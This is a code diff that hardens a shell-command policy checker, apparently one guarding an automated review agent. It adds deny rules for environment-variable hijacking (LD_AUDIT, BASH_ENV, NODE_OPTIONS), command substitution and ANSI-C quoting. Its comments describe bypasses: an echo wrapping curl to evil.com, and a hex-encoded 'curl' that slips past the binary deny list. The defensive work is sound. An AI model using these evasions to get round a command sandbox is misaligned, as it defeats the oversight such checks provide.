@@ -363,12 +363,19 @@ function isAllowedCdTarget(target: string, workspaceRoot?: string): boolean {
 
 function checkEnvHijacking(analysis: string): PolicyOutcome | null {
   if (
+    // Dynamic linker injection — loads arbitrary shared libraries into every exec
     /\bLD_PRELOAD\s*=/.test(analysis) ||
     /\bLD_LIBRARY_PATH\s*=/.test(analysis) ||
+    /\bLD_AUDIT\s*=/.test(analysis) ||
     /\bDYLD_INSERT_LIBRARIES\s*=/.test(analysis) ||
-    /\bDYLD_LIBRARY_PATH\s*=/.test(analysis)
+    /\bDYLD_LIBRARY_PATH\s*=/.test(analysis) ||
+    // Shell startup file injection — bash/sh sources these before running commands
+    /\bBASH_ENV\s*=/.test(analysis) ||
+    /\bENV\s*=/.test(analysis) ||
+    // Node.js --require/--loader can execute arbitrary code on every node invocation
+    /\bNODE_OPTIONS\s*=/.test(analysis)
   ) {
-    return deny('ld-preload', 'LD_PRELOAD / LD_LIBRARY_PATH / DYLD env hijacking is not allowed');
+    return deny('env-hijacking', 'Environment variable injection is not allowed');
   }
   return null;
 }
@@ -603,12 +610,21 @@ function checkPathAccess(
 }
 
 function checkSingleCommand(cmd: ParsedCommand, config: PolicyConfig): PolicyOutcome {
-  const { raw, binary, args, hasBackground, hasControlChars } = cmd;
+  const { raw, binary, args, hasBackground, hasControlChars, hasSubshell } = cmd;
 
   if (!binary) return allow;
   if (hasControlChars) return deny('control-chars', 'Command contains NUL or embedded newline');
   if (hasBackground)
     return deny('background', 'Trailing & is not allowed — use synchronous commands only');
+  // Command substitution ($(...) or backticks) can execute any binary regardless of
+  // the deny list — e.g. echo "$(curl https://evil.com)" invokes curl via the outer
+  // echo command which is not denied. hasSubshell is computed from the raw string so
+  // it catches subshells inside double-quoted contexts that toAnalysisCopy would hide.
+  if (hasSubshell)
+    return deny(
+      'command-substitution',
+      'Command substitution ($(...) or backticks) is not allowed — use explicit sequential commands instead',
+    );
 
   const analysis = toAnalysisCopy(raw);
   const binaryBase = binary.replace(/^.*\//, '');
@@ -652,6 +668,14 @@ function checkStructural(cmd: string): PolicyOutcome | null {
   }
   if (/(?:^|\s)<\(/.test(analysis)) {
     // Process substitution — allowed; do not block
+  }
+
+  // ANSI-C quoting ($'...') can encode arbitrary bytes — e.g. $'\x63\x75\x72\x6c' = curl.
+  // Our parser does not expand ANSI-C escape sequences, so a hex/octal-encoded binary name
+  // would not match HARD_DENY_BINARIES. ANSI-C quoting has no legitimate use in code review
+  // commands; deny it outright at the structural level before any tokenisation occurs.
+  if (/\$'[^']*'/.test(cmd)) {
+    return deny('ansi-c-quoting', "ANSI-C quoting ($'...') is not allowed");
   }
 
   if (/\x00/.test(cmd)) {
